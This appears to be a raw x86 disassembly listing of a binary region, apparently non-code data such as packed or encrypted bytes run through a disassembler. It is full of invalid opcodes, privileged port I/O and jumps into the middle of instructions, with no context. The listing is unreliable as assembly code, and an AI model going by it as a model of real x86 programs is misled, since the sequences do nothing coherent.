  423fae:	in     eax,0xa
  423fb0:	and    eax,0x452c5798
  423fb5:	cmp    BYTE PTR [ebp+0x1ac2868c],0xcc
  423fbc:	and    al,0x4a
  423fbe:	push   ebx
  423fbf:	mov    bh,0xab
  423fc1:	les    ebx,FWORD PTR cs:[ebx-0x6c]
  423fc5:	adc    esi,DWORD PTR [ebp+0x5d09dd2f]
  423fcb:	lds    edi,FWORD PTR [ebp+edx*2-0x2e]
  423fcf:	mov    al,0xf3
  423fd1:	sub    dh,BYTE PTR [ebp+0x6b0456ee]
  423fd7:	mov    eax,ds:0xf298b8cf
  423fdc:	fsubrp st(6),st
  423fde:	shr    DWORD PTR [edx+0xc],1
  423fe1:	test   DWORD PTR [ecx-0x10],ebp
  423fe4:	enter  0xe787,0x1b
  423fe8:	fdiv   QWORD PTR [edx-0x6f]
  423feb:	aam    0xdb
  423fed:	xor    BYTE PTR [ecx+0x3cbc97a4],0x42
  423ff4:	mov    bh,BYTE PTR [edx+0x323a28b8]
  423ffa:	imul   ebx,DWORD PTR [esi+0x1991e677],0x33
  424001:	and    ah,dl
  424003:	jge    0x423fe0
  424005:	jbe    0x424050
  424007:	cmp    eax,0x38b5af3a
  42400c:	test   eax,0x5d37da30
  424011:	int    0xba
  424013:	pop    esi
  424014:	jecxz  0x423fce
  424016:	adc    ecx,esi
  424018:	jmp    0x811e385b
  42401d:	sub    DWORD PTR [ecx],0xffffffd1
  424020:	in     eax,dx
  424021:	lock sahf 
  424023:	xor    BYTE PTR [ecx],0x6a
  424026:	call   edx
  424028:	lds    edi,FWORD PTR [ebp+0x51]
  42402b:	inc    ebp
  42402c:	push   ecx
  42402d:	lods   al,BYTE PTR ds:[esi]
  42402e:	pop    ebp
  42402f:	pop    edi
  424030:	mov    eax,0x1fc6aa2
  424035:	iret   
  424036:	add    ebx,eax
  424038:	mov    esi,0xa7617832
  42403d:	ja     0x424063
  42403f:	aas    
  424040:	xchg   esi,eax
  424041:	shr    eax,1
  424043:	xor    DWORD PTR [edx*8-0x24486968],ecx
  42404a:	js     0x42407b
  42404c:	xchg   edx,eax
  42404d:	xchg   BYTE PTR [ecx-0x2a7200c7],cl
  424053:	ret    
  424054:	imul   edi,DWORD PTR [esi+0x1090d117],0xffffffda
  42405b:	fdiv   DWORD PTR [eax+0x291fdc50]
  424061:	retf   0xe73a
  424064:	cdq    
  424065:	shl    DWORD PTR [ecx-0x1f],0x52
  424069:	jp     0x423ff2
  42406b:	sahf   
  42406c:	adc    al,cl
  42406e:	aad    0x53
  424070:	xor    cl,BYTE PTR [ecx]
  424072:	pop    edi
  424074:	out    dx,eax
  424075:	dec    esp
  424076:	nop
  424077:	(bad)  
  424078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424079:	clc    
  42407a:	add    DWORD PTR [ebx+0x76dd070e],esi
  424080:	mov    BYTE PTR [eax],bh
  424082:	hlt    
  424083:	std    
  424084:	cmp    eax,0x144bec3b
  424089:	xchg   edx,ebx
  42408b:	and    DWORD PTR [esp+ebp*1+0x3056a009],ebp
  424092:	aaa    
  424093:	jne    0x4240a0
  424095:	ret    
  424096:	cmp    BYTE PTR [ebp+0x461d0a1],bh
  42409c:	ja     0x424085
  42409e:	ret    0x2e7
  4240a1:	mov    ds:0xca4c86ce,eax
  4240a6:	int3   
  4240a7:	jae    0x4240b8
  4240a9:	mov    ds:0xe14c66f,al
  4240ae:	push   ecx
  4240af:	jecxz  0x4240fa
  4240b1:	or     edx,DWORD PTR [edx]
  4240b3:	fldcw  WORD PTR [ebp+edi*2-0x7eebe9fb]
  4240ba:	in     eax,0xc0
  4240bc:	lahf   
  4240bd:	sbb    ebp,eax
  4240bf:	daa    
  4240c0:	stc    
  4240c1:	dec    BYTE PTR [ebx]
  4240c3:	shr    BYTE PTR [edi],0xaa
  4240c6:	rol    DWORD PTR [edx],1
  4240c8:	inc    esp
  4240c9:	in     al,dx
  4240ca:	mov    bl,0x53
  4240cc:	cdq    
  4240cd:	adc    al,0x25
  4240cf:	fs (bad) 
  4240d2:	pop    ebx
  4240d3:	mov    edx,0x54bc41a3
  4240d8:	pop    esp
  4240d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240da:	mov    ecx,0x1c6be84e
  4240df:	into   
  4240e0:	xchg   esi,eax
  4240e1:	in     eax,dx
  4240e2:	mov    dh,0x48
  4240e4:	inc    esi
  4240e5:	scas   eax,DWORD PTR es:[edi]
  4240e6:	adc    eax,0xbca70cb
  4240eb:	shl    BYTE PTR [edx+0x4f24fc37],1
  4240f1:	or     DWORD PTR [esi+edx*8-0x4ab03089],ecx
  4240f8:	in     al,0x36
  4240fa:	adc    eax,0x3adebf31
  4240ff:	imul   edi,DWORD PTR [ebx],0x89a65414
  424105:	and    al,0xc8
  424107:	xor    BYTE PTR [edx+ebx*8+0x64140ab],0xee
  42410f:	push   edi
  424110:	cmc    
  424111:	xlat   BYTE PTR ds:[ebx]
  424112:	and    DWORD PTR [ecx+ebp*2+0x64cfe3e6],ebx
  424119:	add    al,0xae
  42411b:	int    0x30
  42411d:	mov    esp,0x1db9dae0
  424122:	or     ebx,DWORD PTR [esi-0x38]
  424125:	dec    ebx
  424126:	jne    0x4240e9
  424128:	sbb    ebp,DWORD PTR [ebp+0x11]
  42412b:	fcomp  DWORD PTR [ebx-0xf]
  42412e:	das    
  42412f:	mov    edi,0x3ff9a93e
  424134:	xchg   ecx,eax
  424135:	xchg   edx,eax
  424136:	push   ecx
  424137:	push   0x76
  424139:	call   FWORD PTR [edi+0x6a999c06]
  42413f:	mov    eax,0xee4af7c5
  424144:	xor    DWORD PTR [esi],edi
  424146:	or     BYTE PTR [edx],al
  424148:	sar    BYTE PTR [ebx-0x2c],cl
  42414b:	or     ah,BYTE PTR [ebp-0x6e]
  42414e:	cmp    ah,dl
  424150:	int    0x2c
  424152:	popa   
  424153:	shl    ebp,cl
  424155:	ficom  WORD PTR [edx+0x29]
  424158:	xchg   BYTE PTR [esi+esi*2-0x2a4c8377],ch
  42415f:	sub    eax,ecx
  424161:	sub    eax,0xc0b70173
  424166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424167:	retf   
  424168:	adc    BYTE PTR [ebp+0x37d2e0b6],ch
  42416e:	retf   0xf28
  424171:	sbb    edi,DWORD PTR [edi-0x2a66776f]
  424177:	mov    ds:0xe58868ae,eax
  42417c:	jg     0x424118
  42417e:	fbstp  TBYTE PTR [ebx+0x796c2ee3]
  424184:	cs into 
  424186:	fistp  DWORD PTR [eax-0x76594b23]
  42418c:	test   ebp,eax
  42418e:	cmp    dh,BYTE PTR [edi+0x6a015402]
  424194:	push   ds
  424195:	scas   al,BYTE PTR es:[edi]
  424196:	in     eax,dx
  424197:	fwait
  424198:	out    dx,al
  424199:	daa    
  42419a:	dec    esp
  42419b:	or     BYTE PTR [edi],0x39
  42419e:	cmp    BYTE PTR gs:[eax],0x45
  4241a2:	shl    BYTE PTR [ebp+0x174d3d85],1
  4241a8:	cs mov eax,0x3e06b1cb
  4241ae:	in     eax,dx
  4241af:	xor    al,0x22
  4241b1:	or     ecx,0x2501b9bb
  4241b7:	xchg   esi,eax
  4241b8:	push   es
  4241b9:	mov    ch,BYTE PTR ds:0xdd8faec2
  4241bf:	mov    eax,0xc095beed
  4241c4:	in     eax,0x77
  4241c6:	mov    ebp,0x9c0047cc
  4241cc:	and    ecx,eax
  4241ce:	add    edx,DWORD PTR [esi-0x67]
  4241d1:	pop    edi
  4241d2:	out    0xc1,al
  4241d4:	mov    al,ds:0xbd0061fa
  4241d9:	sub    ebx,DWORD PTR [edi+0x18d87653]
  4241df:	cmp    BYTE PTR [ebp+0x52],ch
  4241e2:	mov    bl,BYTE PTR [esi-0x5f]
  4241e5:	mov    esi,0x5228fd9f
  4241ea:	jge    0x42422f
  4241ec:	dec    eax
  4241ed:	out    dx,al
  4241ee:	inc    edx
  4241ef:	xchg   esp,eax
  4241f0:	popf   
  4241f1:	cld    
  4241f2:	xchg   edx,eax
  4241f3:	(bad)  
  4241f4:	mov    edi,0x9e8bc281
  4241f9:	mov    esp,0x3d9284a6
  4241fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241ff:	ins    BYTE PTR es:[edi],dx
  424200:	push   es
  424201:	xchg   DWORD PTR [edi+0x4055525e],edx
  424207:	and    ch,ch
  424209:	and    al,0x91
  42420b:	aam    0x59
  42420d:	jae    0x4241fb
  42420f:	(bad)  
  424211:	pop    edi
  424212:	enter  0x1a3,0x67
  424216:	add    eax,0xb8d49c52
  42421b:	mov    bh,0x93
  42421d:	cwde   
  42421e:	and    BYTE PTR [eax+ebx*4],0x4e
  424222:	pop    edx
  424223:	lds    eax,FWORD PTR [ecx-0x75]
  424226:	add    eax,0x59253aca
  42422b:	mov    ch,0x79
  42422d:	mov    ebx,0x6d62c491
  424232:	and    eax,0x231702d0
  424237:	std    
  424238:	cmp    eax,0xe4645974
  42423d:	test   al,0xcc
  42423f:	sub    eax,0xa416f115
  424244:	imul   ebx,DWORD PTR [edx],0xffffffb1
  424247:	mov    ebx,0x34e2e69c
  42424c:	cmp    DWORD PTR [eax-0x35c7dc48],ebp
  424252:	out    0xa5,al
  424254:	cmp    dh,BYTE PTR [ebp+0x36]
  424257:	daa    
  424258:	push   edi
  424259:	das    
  42425a:	inc    eax
  42425b:	jecxz  0x424296
  42425d:	jne    0x4242a5
  42425f:	inc    ebp
  424260:	hlt    
  424261:	mov    al,ds:0x22faa271
  424266:	pop    edx
  424267:	(bad)  
  424268:	xor    edx,DWORD PTR [eax+0x5a500334]
  42426e:	repnz ds push ebp
  424271:	add    edi,DWORD PTR [esp+ebp*8-0x68]
  424275:	and    DWORD PTR [ebx-0x449cb1e3],ebp
  42427b:	retf   0x7a60
  42427e:	push   esp
  42427f:	mov    cl,0xb9
  424281:	xor    BYTE PTR [edx],ch
  424283:	sub    al,0x2b
  424285:	rcl    DWORD PTR [ecx+0x6910c6dc],1
  42428b:	test   DWORD PTR [ebx-0x71],esp
  42428e:	cmp    al,0xd6
  424290:	push   ebx
  424291:	cmp    al,0xb5
  424293:	dec    edx
  424294:	inc    esp
  424295:	jp     0x42427b
  424297:	adc    bh,BYTE PTR [esi+0x53]
  42429a:	xchg   esp,eax
  42429b:	mov    WORD PTR [ebp+0x153d4fa9],ss
  4242a1:	sti    
  4242a2:	or     DWORD PTR [edx+0x7f13e77],ebp
  4242a8:	mov    dl,0x9f
  4242aa:	cmp    BYTE PTR [ebx-0x67],0x30
  4242ae:	lods   ax,WORD PTR ds:[esi]
  4242b0:	or     DWORD PTR [edi+ebx*2],ebp
  4242b3:	cmp    DWORD PTR [esi+0x60],ebp
  4242b6:	pop    eax
  4242b7:	push   0x21bb8477
  4242bc:	xchg   BYTE PTR [ecx+0x6],bh
  4242bf:	es push cs
  4242c1:	push   ss
  4242c2:	and    DWORD PTR [ebp+0x69],edi
  4242c5:	inc    edi
  4242c6:	aam    0x21
  4242c8:	gs inc eax
  4242ca:	mov    ds:0x8c65d714,al
  4242cf:	jb     0x424276
  4242d1:	sar    dh,cl
  4242d3:	push   ebp
  4242d4:	je     0x4242d1
  4242d6:	push   ds
  4242d7:	addr16 loop 0x424317
  4242da:	pop    esp
  4242db:	or     eax,DWORD PTR [eax-0x52]
  4242de:	mov    dh,0x6e
  4242e0:	mov    bl,0xec
  4242e2:	add    bl,BYTE PTR [ebp-0x2c]
  4242e5:	(bad)  
  4242e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242e8:	rcr    BYTE PTR [ecx+0x1928ef31],1
  4242ee:	out    0x25,eax
  4242f0:	cdq    
  4242f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242f2:	pop    ebp
  4242f3:	push   ebx
  4242f4:	jb     0x4242cc
  4242f6:	pop    esi
  4242f7:	iret   
  4242f8:	and    al,0xfb
  4242fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242fb:	fs rol esi,1
  4242fe:	imul   edx,ebp,0xffffff81
  424301:	dec    ebp
  424302:	je     0x4242ee
  424304:	mov    gs,WORD PTR [eax]
  424306:	setae  BYTE PTR [ecx+0x69be959c]
  42430d:	call   0xf7577884
  424312:	xchg   ebx,eax
  424313:	outs   dx,BYTE PTR ds:[esi]
  424314:	idiv   DWORD PTR [ecx]
  424316:	mov    eax,ds:0x195d4f26
  42431b:	mov    dl,0xa3
  42431d:	mov    cl,0x44
  42431f:	scas   eax,DWORD PTR es:[edi]
  424320:	sub    al,0x2d
  424322:	addr16 jae 0x424333
  424325:	sbb    BYTE PTR [ecx],0xa4
  424328:	xor    DWORD PTR [eax],ecx
  42432a:	rol    DWORD PTR [ebp+0x40],cl
  42432d:	mov    al,0xa3
  42432f:	sub    DWORD PTR [edi+0x69d6d398],0x2f
  424336:	sub    eax,0x1a1d767d
  42433b:	ins    DWORD PTR es:[edi],dx
  42433c:	dec    ebx
  42433d:	fimul  WORD PTR [esi]
  42433f:	mov    cl,BYTE PTR [ebp-0x53b20eaa]
  424345:	int    0x9a
  424347:	imul   ebx,DWORD PTR [ebp-0xaef4bf3],0xfffffff1
  42434e:	les    ebx,FWORD PTR [ecx+ebx*1]
  424351:	push   0xffffff82
  424353:	es sub eax,0xe9c70c6c
  424359:	call   0xd5e50c35
  42435e:	push   eax
  42435f:	fs lock xor al,0xd9
  424363:	into   
  424364:	lahf   
  424365:	stos   DWORD PTR es:[edi],eax
  424366:	mov    ds:0xc9bf8353,eax
  42436b:	cmp    al,0x65
  42436d:	int3   
  42436e:	sub    eax,0xa9cd2881
  424373:	stc    
  424374:	jno    0x424370
  424376:	icebp  
  424377:	out    0x20,eax
  424379:	sbb    DWORD PTR [edi-0x58],esi
  42437c:	div    BYTE PTR [esi]
  42437e:	mov    esi,0x9dfc21d0
  424383:	(bad)  
  424384:	pop    edi
  424385:	jge    0x424319
  424387:	in     al,dx
  424388:	ret    
  424389:	scas   al,BYTE PTR es:[edi]
  42438a:	inc    ebp
  42438b:	fcmovnu st,st(4)
  42438d:	sbb    eax,ebx
  42438f:	in     al,0xaa
  424391:	rcl    BYTE PTR [esi],1
  424393:	adc    eax,0x1f496c41
  424398:	ficomp DWORD PTR fs:[eax+0x60220c39]
  42439f:	mov    cl,0x2e
  4243a1:	scas   eax,DWORD PTR es:[edi]
  4243a2:	cmp    al,0xe7
  4243a4:	push   0xffffff94
  4243a6:	pop    ebp
  4243a7:	cmp    eax,0xfb3e8932
  4243ac:	test   al,0x9e
  4243ae:	xchg   DWORD PTR [ebx+0x4e],esi
  4243b1:	or     ebp,DWORD PTR [ecx+0x25]
  4243b4:	cmp    ebx,ecx
  4243b6:	mov    eax,0xd253b9f5
  4243bb:	inc    edx
  4243bc:	mov    bh,0x4b
  4243be:	pop    ebp
  4243bf:	cld    
  4243c0:	or     ebp,ebx
  4243c2:	outs   dx,BYTE PTR ds:[esi]
  4243c3:	pop    ds
  4243c4:	ins    BYTE PTR es:[edi],dx
  4243c5:	jno    0x424351
  4243c7:	xchg   ecx,eax
  4243c8:	push   ebp
  4243c9:	das    
  4243ca:	pop    edx
  4243cb:	inc    esp
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x4243b2
  4243d7:	leave  
  4243d8:	popa   
  4243d9:	mov    cl,0x38
  4243db:	rol    BYTE PTR [ecx],cl
  4243dd:	add    BYTE PTR [eax-0x50fffffa],cl
  4243e3:	icebp  
  4243e4:	gs retf 
  4243e6:	lods   al,BYTE PTR ds:[esi]
  4243e7:	push   cs
  4243e8:	jns    0x42438b
  4243ea:	push   DWORD PTR [ecx+0x6e]
  4243ed:	gs jo  0x42437f
  4243f0:	mov    cl,0x3a
  4243f2:	out    dx,eax
  4243f3:	addr16 nop
  4243f5:	xchg   esp,eax
  4243f6:	or     dl,BYTE PTR [ebp-0x5]
  4243f9:	rol    DWORD PTR ds:0x31fa1b87,1
  4243ff:	push   ds
  424400:	idiv   DWORD PTR [ebp+0xc2a08f2]
  424406:	inc    edi
  424407:	jl     0x424450
  424409:	mov    dl,0xdf
  42440b:	call   0x5830:0x695b7f65
  424412:	pop    edi
  424413:	and    eax,0x4e8bface
  424418:	or     ah,dh
  42441a:	and    edx,DWORD PTR [eax+0x56268cdb]
  424420:	cmc    
  424421:	iret   
  424422:	cmp    al,dh
  424424:	xor    DWORD PTR [ecx+eax*2+0x5421c9bd],edi
  42442b:	xor    BYTE PTR [edi+eiz*8+0x4ebf8f82],bh
  424432:	loop   0x4243c6
  424434:	in     eax,0x0
  424436:	add    DWORD PTR ds:0x79c672c5,eax
  42443c:	cmc    
  42443d:	push   edi
  42443e:	dec    esp
  42443f:	lahf   
  424440:	inc    ecx
  424441:	es out dx,eax
  424443:	and    esi,DWORD PTR [ebx-0x211868b1]
  424449:	xor    eax,0xb88eb972
  42444e:	adc    dl,BYTE PTR [eax-0x6d2f3a28]
  424454:	shr    cl,1
  424456:	add    eax,0xd319f41d
  42445b:	inc    esp
  42445c:	add    al,0x9
  42445e:	dec    edi
  42445f:	and    al,0x77
  424461:	das    
  424462:	test   al,0xf6
  424464:	leave  
  424465:	ss inc ebx
  424467:	mov    cl,BYTE PTR [esi+ebx*1+0x57]
  42446b:	mov    esp,DWORD PTR [ebx]
  42446d:	xchg   edi,eax
  42446e:	(bad)  
  42446f:	push   edi
  424470:	dec    esi
  424471:	js     0x4244ac
  424473:	imul   esp,DWORD PTR [ecx-0xd],0xffffffa8
  424477:	aam    0xed
  424479:	int    0x94
  42447b:	stos   BYTE PTR es:[edi],al
  42447c:	xchg   ecx,eax
  42447d:	adc    esi,ebx
  42447f:	xor    BYTE PTR [edx+0x2a],0xe4
  424483:	out    0xd8,eax
  424485:	retf   0x16d4
  424488:	ja     0x4244d2
  42448a:	inc    esp
  42448b:	adc    al,0xad
  42448d:	or     al,0x16
  42448f:	ins    BYTE PTR es:[edi],dx
  424490:	inc    esp
  424491:	fiadd  DWORD PTR [esi+ecx*4+0xd]
  424495:	jae    0x424471
  424497:	ficom  DWORD PTR ds:0xaccbf74f
  42449d:	stos   BYTE PTR es:[edi],al
  42449e:	mov    eax,ds:0xb2117d9b
  4244a3:	mov    al,ds:0x32c6c7ff
  4244a8:	mov    edi,0x9663d35c
  4244ad:	and    al,0xc2
  4244af:	sbb    eax,0xa8a07455
  4244b4:	jmp    0x2829:0xcfcca836
  4244bb:	mov    eax,ds:0x40a87562
  4244c0:	pop    ebp
  4244c1:	aas    
  4244c2:	cs gs faddp st(6),st
  4244c6:	inc    eax
  4244c7:	pop    esp
  4244c8:	add    esp,DWORD PTR [eax-0x4866ddc0]
  4244ce:	and    eax,0x4cc8f41b
  4244d3:	sub    eax,0xa89fd7c9
  4244d8:	cld    
  4244d9:	daa    
  4244da:	clc    
  4244db:	fmul   st(4),st
  4244dd:	je     0x424469
  4244df:	mov    esi,0xf329042a
  4244e4:	fwait
  4244e5:	test   BYTE PTR [ecx],0xa2
  4244e8:	push   ebp
  4244e9:	ins    DWORD PTR es:[edi],dx
  4244ea:	xchg   esi,eax
  4244eb:	add    BYTE PTR [edx-0x69],dh
  4244ee:	mov    edx,DWORD PTR [edx+0x638f924a]
  4244f4:	sar    DWORD PTR [esi+ebx*2+0x78],0x6
  4244f9:	add    eax,0x67896158
  4244fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244ff:	push   0x51
  424501:	mov    dh,0x45
  424503:	lds    esp,FWORD PTR [edi+0x7e]
  424506:	test   BYTE PTR [eax],cl
  424508:	in     al,0x4f
  42450a:	outs   dx,BYTE PTR ds:[esi]
  42450b:	cmp    eax,0xa77c3ab0
  424510:	xchg   esp,eax
  424511:	rol    DWORD PTR [eax],1
  424513:	out    0xd1,eax
  424515:	loopne 0x4244db
  424517:	sbb    ebx,ebp
  424519:	pop    edi
  42451a:	xchg   edx,eax
  42451b:	mov    eax,ds:0x55f5b2a7
  424520:	ins    DWORD PTR es:[edi],dx
  424521:	fst    st(0)
  424523:	lahf   
  424524:	aaa    
  424525:	jns    0x4245a5
  424527:	inc    edx
  424528:	xor    BYTE PTR [eax+0x44047789],dh
  42452e:	mov    cl,0x28
  424530:	inc    esp
  424531:	popa   
  424532:	iret   
  424533:	repz inc edi
  424535:	scas   al,BYTE PTR es:[edi]
  424536:	sub    ebx,edx
  424538:	call   0x398f:0x96f3e2bd
  42453f:	cmp    ch,BYTE PTR [ecx+0x3f002bc5]
  424545:	and    DWORD PTR [edx+0x51eb0124],esp
  42454b:	dec    eax
  42454c:	jle    0x42458e
  42454e:	hlt    
  42454f:	or     al,0xf0
  424551:	clc    
  424552:	cli    
  424553:	(bad)  
  424554:	dec    ebx
  424555:	test   DWORD PTR [ecx],ecx
  424557:	and    bl,dl
  424559:	ror    BYTE PTR [eax-0x3232531b],0x3e
  424560:	adc    al,0xe8
  424562:	mov    eax,0x7a487c7e
  424567:	into   
  424568:	sbb    DWORD PTR [esi-0x4093fddf],esp
  42456e:	xor    BYTE PTR [esi-0x21991c16],bh
  424574:	lods   eax,DWORD PTR ds:[esi]
  424575:	rcl    BYTE PTR ds:0xacfaac87,cl
  42457b:	push   0x510c909a
  424580:	add    edi,DWORD PTR [ebx-0xcbd1b29]
  424586:	push   ds
  424587:	js     0x4245cf
  424589:	and    eax,0x9e080836
  42458e:	cli    
  42458f:	mov    cl,0xa9
  424591:	gs repnz aad 0xe9
  424595:	dec    edx
  424596:	ja     0x424585
  424598:	xor    al,0xa7
  42459a:	jmp    0x11ac1fc7
  42459f:	sbb    al,0xe9
  4245a1:	jp     0x424622
  4245a3:	jp     0x42460a
  4245a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245a6:	xchg   DWORD PTR [ebx+0x72d87205],eax
  4245ac:	mov    al,ds:0xca153043
  4245b1:	in     al,dx
  4245b2:	jo     0x42454f
  4245b4:	aas    
  4245b5:	jno    0x424552
  4245b7:	jg     0x4245af
  4245b9:	clc    
  4245ba:	out    0x64,eax
  4245bc:	jmp    0x9b364284
  4245c1:	push   cs
  4245c2:	jnp    0x4245b9
  4245c4:	and    DWORD PTR [edi+esi*1+0x5b031cb8],ebx
  4245cb:	sub    al,0x23
  4245cd:	clc    
  4245ce:	cld    
  4245cf:	int    0x1c
  4245d1:	push   ss
  4245d2:	mov    al,ds:0xaeeec441
  4245d7:	sub    dl,BYTE PTR ds:0x6aaa726b
  4245dd:	sbb    DWORD PTR [eax+0x165a6760],ebp
  4245e3:	cmp    BYTE PTR [esi-0x1cfcc1db],0x7d
  4245ea:	xor    esi,DWORD PTR [edx+0x58]
  4245ed:	in     eax,0x89
  4245ef:	cdq    
  4245f0:	mov    ebx,0xba646fa6
  4245f5:	jb     0x424665
  4245f7:	sub    eax,0x26ca86b2
  4245fc:	pushf  
  4245fd:	add    BYTE PTR [eax],bl
  4245ff:	adc    ah,BYTE PTR [ebx+0x5f]
  424602:	or     edx,DWORD PTR [ecx+0x3482a423]
  424608:	mov    ds:0x7c45abcc,al
  42460d:	ret    
  42460e:	mov    ds:0x7bf4789,eax
  424613:	in     eax,dx
  424614:	fs out 0xbe,eax
  424617:	mov    DWORD PTR [edx-0x572a0314],0xb1128be6
  424621:	aam    0xbd
  424623:	xchg   ebp,eax
  424624:	outs   dx,BYTE PTR ds:[esi]
  424625:	lods   al,BYTE PTR ds:[esi]
  424626:	mov    dh,0xaf
  424628:	(bad)  
  424629:	adc    DWORD PTR [esi],ebx
  42462b:	jmp    0x4245c2
  42462d:	xchg   ecx,eax
  42462e:	aas    
  42462f:	sub    eax,0xc2a9f95a
  424634:	dec    eax
  424635:	sub    edi,DWORD PTR [ebx]
  424637:	repnz sub esp,DWORD PTR [ecx-0x70]
  42463b:	retf   
  42463c:	lahf   
  42463d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42463e:	sub    DWORD PTR [eax-0x2cb71099],edi
  424644:	sbb    eax,0xf03a145b
  424649:	bnd jnp 0x424685
  42464c:	push   es
  42464d:	mov    BYTE PTR [ebp-0x5348d541],cl
  424653:	jle    0x424652
  424655:	push   ss
  424656:	scas   al,BYTE PTR es:[edi]
  424657:	out    dx,eax
  424658:	fistp  DWORD PTR [eax+0x20]
  42465b:	mov    cl,0x6c
  42465d:	sub    ecx,edx
  42465f:	in     eax,dx
  424660:	dec    edi
  424661:	pop    edx
  424662:	xor    DWORD PTR [edi+edi*2-0x22],edx
  424666:	popf   
  424667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424668:	das    
  424669:	jns    0x42464d
  42466b:	and    bh,dl
  42466d:	mov    dh,0x46
  42466f:	scas   al,BYTE PTR es:[edi]
  424670:	outs   dx,BYTE PTR ds:[esi]
  424671:	or     eax,0x81a9d1b5
  424676:	or     BYTE PTR [ebx],dl
  424678:	jno    0x42463d
  42467a:	dec    ebx
  42467b:	call   0xa30e:0x5bce3cde
  424682:	in     eax,0x1b
  424684:	add    al,0x22
  424686:	jb     0x4246a7
  424688:	imul   ebp,DWORD PTR [esi-0x53],0x15e8dc86
  42468f:	jge    0x424620
  424691:	iret   
  424692:	and    eax,0xafe865bb
  424697:	jmp    0x4246de
  424699:	pop    ebx
  42469a:	ds out dx,al
  42469c:	add    eax,0x1de1e990
  4246a1:	push   edi
  4246a2:	jle    0x42467d
  4246a4:	loop   0x424663
  4246a6:	push   ss
  4246a7:	jle    0x424695
  4246a9:	dec    edi
  4246aa:	inc    esi
  4246ab:	mov    edx,0xf291c82d
  4246b0:	mov    ebp,0xe54a9662
  4246b5:	(bad)  
  4246b6:	je     0x424645
  4246b8:	ins    BYTE PTR es:[edi],dx
  4246b9:	xchg   ebx,eax
  4246ba:	push   0x17
  4246bc:	or     ebp,ebp
  4246be:	lea    ecx,[ebx]
  4246c0:	dec    esp
  4246c1:	std    
  4246c2:	mov    ecx,0xf85acb8f
  4246c7:	clc    
  4246c8:	pop    ss
  4246c9:	sar    DWORD PTR [esp+ebx*2+0x5ca88d1e],0xae
  4246d1:	xor    dl,BYTE PTR es:[edx]
  4246d4:	(bad)  
  4246d5:	xchg   esi,eax
  4246d6:	add    ch,ch
  4246d8:	ja     0x4246f1
  4246da:	jl     0x4246f4
  4246dc:	jns    0x42471b
  4246de:	retf   
  4246df:	push   edx
  4246e0:	and    DWORD PTR [edx-0x3],ecx
  4246e3:	mov    ch,0x7
  4246e5:	mov    dh,0x51
  4246e7:	leave  
  4246e8:	call   0xfa59042c
  4246ed:	(bad)  
  4246ee:	(bad)  [edi+0x20]
  4246f1:	dec    esi
  4246f2:	rcr    DWORD PTR [ebx+0x1bc9afcf],1
  4246f8:	scas   eax,DWORD PTR es:[edi]
  4246f9:	(bad)  
  4246fa:	push   cs
  4246fb:	ret    0x2457
  4246fe:	loope  0x4246cc
  424700:	push   ds
  424701:	sub    eax,0x601b5261
  424706:	sbb    edi,DWORD PTR es:[ebp+0xdc7483d]
  42470d:	mov    edi,0xc9ec668a
  424712:	out    dx,eax
  424713:	sti    
  424714:	fwait
  424715:	push   ss
  424716:	es xor al,0x14
  424719:	pushf  
  42471a:	in     eax,0x64
  42471c:	push   ds
  42471d:	xor    esi,DWORD PTR [esi-0x48ab9bf6]
  424723:	loopne 0x4246fe
  424725:	mov    ah,0x94
  424727:	adc    al,0xc3
  424729:	lds    edx,FWORD PTR [ebp+0x3]
  42472c:	and    eax,0xaaa6a7af
  424731:	dec    eax
  424732:	xchg   ebp,eax
  424733:	and    BYTE PTR [esi+eiz*2+0x1dd8dcee],bl
  42473a:	call   0xd3a2:0xe36ebf35
  424741:	pop    ecx
  424742:	out    0x42,al
  424744:	out    dx,eax
  424745:	inc    eax
  424746:	xor    eax,0x3e73aa84
  42474b:	pop    ds
  42474c:	jb     0x4247c1
  42474e:	sub    al,BYTE PTR [ebx]
  424750:	lds    esp,FWORD PTR [esi+0x1548d9bf]
  424756:	ss xchg esp,eax
  424758:	sbb    dh,BYTE PTR [ebx]
  42475a:	aas    
  42475b:	mov    ?,WORD PTR [eax]
  42475d:	jecxz  0x42476d
  42475f:	pop    es
  424760:	push   ds
  424761:	icebp  
  424762:	out    0x73,al
  424764:	stc    
  424765:	dec    esi
  424766:	paddsw mm2,QWORD PTR [edi-0x21]
  42476a:	push   esp
  42476b:	fistp  QWORD PTR [esi-0x50]
  42476e:	call   0xf1ca6925
  424773:	loope  0x424754
  424775:	cmp    edx,DWORD PTR [ebx+0x2f137840]
  42477b:	and    ecx,DWORD PTR [esi+ebp*4]
  42477e:	push   0x63
  424780:	or     bl,0x37
  424783:	call   0x1b42:0x7227752c
  42478a:	pop    ebx
  42478b:	cmp    bl,cl
  42478d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42478e:	mov    ecx,DWORD PTR [ebx+0x8c2e98e]
  424794:	in     eax,0x8d
  424796:	fild   DWORD PTR [ebx+0x77492f80]
  42479c:	sti    
  42479d:	pusha  
  42479e:	cmp    ebp,DWORD PTR [esi+0x7e]
  4247a1:	pop    eax
  4247a2:	xor    eax,0xb9c4436a
  4247a7:	or     al,0x2d
  4247a9:	retf   
  4247aa:	cwde   
  4247ab:	popa   
  4247ac:	rol    BYTE PTR [ebx+0x7e],0x18
  4247b0:	mov    ebp,0x816930c
  4247b5:	(bad)  [ebx+0x2d]
  4247b8:	mov    esp,0x5c37b0e0
  4247bd:	mov    ds:0x3b679585,eax
  4247c2:	nop
  4247c3:	xlat   BYTE PTR ds:[ebx]
  4247c4:	bound  ebx,QWORD PTR [ecx-0x68]
  4247c7:	int    0x65
  4247c9:	dec    ecx
